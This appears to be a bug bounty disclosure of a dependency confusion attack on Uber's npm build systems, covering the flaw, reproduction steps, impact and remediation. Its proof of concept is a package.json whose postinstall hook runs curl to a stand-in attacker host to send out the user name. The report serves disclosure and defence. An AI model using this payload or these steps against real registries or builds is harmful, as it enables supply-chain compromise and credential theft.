# Title: RCE via npm Misconfiguration - Dependency Confusion Attack

- **Platform**: Uber Bug Bounty
- **Program**: Uber
- **Severity**: Critical
- **Date**: 2020-10-13
- **Researcher**: Alex Birsan (alexbirsan)
- **Bounty**: $9,000

## Summary

A "Dependency Confusion" vulnerability allowed Remote Code Execution on Uber's internal systems. Alex Birsan discovered that Uber's npm packages referenced internal library names that did not exist in the public npm registry. By uploading malicious packages with those names to the public npm registry, he achieved code execution on Uber's build servers.

## Technical Details

The attack, known as "Dependency Confusion", exploits the way package managers resolve dependency names. When Uber's build system installed npm packages listed in `package.json`, it checked both public and private registries. If a private package name was used but not properly scoped or configured to be fetched only from a private registry, npm would prefer the highest version from the public registry.

Alex found that Uber used several internal npm package names (e.g., `uber-email`, `uber-oauth`) that were not published to the public npm registry. He registered these names on npmjs.com with a higher version number and included malicious `postinstall` scripts. When Uber's CI/CD systems ran `npm install`, they would install his malicious packages instead, executing arbitrary code on Uber's build infrastructure.

## Steps to Reproduce

1. Identify internal Uber npm package names used in `package.json` files
2. Search public npm registry to confirm they are not registered
3. Register the package names on npmjs.com with a malicious `postinstall` script
4. Set the version higher than any potential internal version
5. Wait for Uber's CI/CD systems to run `npm install`
6. The malicious `postinstall` script executes on Uber's build servers

## Proof of Concept

```javascript
// package.json uploaded to npm
{
  "name": "uber-internal-library",
  "version": "99.0.0",
  "scripts": {
    "postinstall": "node -e 'require(\"child_process\").execSync(\"curl http://attacker.com/$(whoami)\")'"
  }
}
```

## Impact

- Remote Code Execution on Uber's CI/CD build servers
- Access to internal source code repositories
- Ability to inject backdoors into production builds
- Access to environment variables, API keys, and deployment credentials
- Supply chain compromise affecting all Uber services

## Remediation

Uber fixed the issue by:
- Configuring npm to fetch internal packages only from private registries
- Using npm scoped packages (`@uber/package-name`) to prevent name conflicts
- Adding integrity validation for dependencies
- Auditing all internal package references

This report was part of a landmark research project where Alex Birsan also found similar vulnerabilities at Apple, Microsoft, and dozens of other companies, leading to industry-wide changes in how organizations handle private package registries.

## References
- https://hackerone.com/reports/1007014
- https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
